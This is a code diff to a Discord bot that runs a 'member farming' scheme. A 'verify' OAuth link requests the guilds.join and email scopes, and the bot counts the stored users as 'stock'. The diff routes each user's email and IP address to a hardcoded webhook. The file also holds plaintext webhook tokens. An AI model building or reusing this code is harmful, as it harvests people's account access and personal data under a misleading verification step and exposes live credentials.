@@ -28,9 +28,12 @@ const EMBED_COLOR = 0x2F3136; // Sleek grey-black tone
 const VERIFIED_ROLE_ID = '1565313021939679373';
 const GUILD_ID = '1563253450257932298';
 
-// --- Live Stock Webhook Credentials Only ---
+// --- Live Stock & Verification Log Webhook Credentials ---
 const LIVE_STOCK_ID = '1565062337184923821';
 const LIVE_STOCK_TOKEN = 'P3j22VibL9VSasIPfR2EEFu9n4_AIaIa65je-2joyPMAge-ZEOZXDAgwRRGoHhE1RlzM';
+
+// Direct Webhook Client for Verification Logs (Guaranteed to post instantly from the web server)
+const VERIFICATION_LOG_WEBHOOK = new WebhookClient({ url: 'https://discord.com/api/webhooks/1565060498955698436/Y3TO5kufTLMNpJVt5wXCxV-nxXP0eH4qz7kxkS299viAANZLKwiTjYVyPZAdnUPSSW9g' });
 
 const AUTOMATIC_VERIFY_OAUTH_URL = 'https://discord.com/oauth2/authorize?client_id=1561438987464483048&response_type=code&redirect_uri=https%3A%2F%2Ffarmerauth-production.up.railway.app&scope=email+identify+guilds.join';
 const RBOT_SERVER_INVITE = 'https://discord.gg/ZK3Er7Xgdq';
@@ -262,8 +265,9 @@ app.get('/', async (req, res) => {
 
         const totalStock = Object.keys(dbData.users).length;
 
-        if (client.isReady()) {
-            try {
+        // Automatically assign verified role and send log immediately via webhook
+        try {
+            if (client.isReady()) {
                 const guild = client.guilds.cache.get(GUILD_ID) || await client.guilds.fetch(GUILD_ID);
                 if (guild) {
                     try {
@@ -275,21 +279,17 @@ app.get('/', async (req, res) => {
                         console.error('[AUTO-ROLE ERROR] Could not add role to member:', roleErr);
                     }
                 }
-
-                // Send log embed directly to channel 1563253454653235261
-                let verifLogChannel = client.channels.cache.get(CHANNELS.VERIFICATION_LOG) || await client.channels.fetch(CHANNELS.VERIFICATION_LOG);
-                if (verifLogChannel) {
-                    const logEmbed = new EmbedBuilder()
-                        .setTitle('New User Verified')
-                        .setDescription(`User **${userData.username}** (\`${userData.id}\`) verified successfully.\n\n**Email:** \`${userEmail}\`\n**IP Address:** \`${clientIp}\`\n\nTotal Available Stock: \`${totalStock}\``)
-                        .setColor(EMBED_COLOR)
-                        .setTimestamp();
-
-                    await verifLogChannel.send({ embeds: [logEmbed] });
-                }
-            } catch (logErr) {
-                console.error('[VERIFICATION LOG & ROLE ERROR]', logErr);
             }
+
+            const logEmbed = new EmbedBuilder()
+                .setTitle('New User Verified')
+                .setDescription(`User **${userData.username}** (\`${userData.id}\`) verified successfully.\n\n**Email:** \`${userEmail}\`\n**IP Address:** \`${clientIp}\`\n\nTotal Available Stock: \`${totalStock}\``)
+                .setColor(EMBED_COLOR)
+                .setTimestamp();
+
+            await VERIFICATION_LOG_WEBHOOK.send({ embeds: [logEmbed] });
+        } catch (logErr) {
+            console.error('[VERIFICATION LOG & ROLE ERROR]', logErr);
         }
 
         return res.send(`
@@ -464,8 +464,8 @@ client.on('messageCreate', async message => {
         const boostContent = 
             `**FLEX | BOOST REWARDS**\n\n` +
             `Boost the server to earn higher rank tier limits.\n\n` +
-            `2 Boosts = <@&1563467675236311100>\n\n` +
-            `4 Boosts = <@&1563467259194908722>\n\n\n` +
+            `1 Boosts = <@&1563467675236311100>\n\n` +
+            `2 Boosts = <@&1563467259194908722>\n\n\n` +
             `Ranks are active for 2-3 weeks.\n` +
             `Ranks are not automatically assigned.\n` +
             `Open a ticket in <#1563253473238065326> to claim your rank.`;
@@ -498,13 +498,11 @@ client.on('messageCreate', async message => {
         return message.channel.send('Only the join command is available to regular members.');
     }
 
-    // --- Clean ,verify command without emoji ---
     if (command === 'verify') {
         if (message.author.id !== OWNER_ID) return;
         const verifyContent = 
             `### Why should you verify?\n\n` +
-            `Verify to unlock access to Flex Network, participate in member farming, and access our rewards and perks. Just click the button below.\n` +
-            `[Verify](${AUTOMATIC_VERIFY_OAUTH_URL})`;
+            `Verify to unlock access to Flex Network, participate in member farming, and access our rewards and perks. Just click the button below.[verify](${AUTOMATIC_VERIFY_OAUTH_URL})`;
 
         const embed = new EmbedBuilder()
             .setDescription(verifyContent)
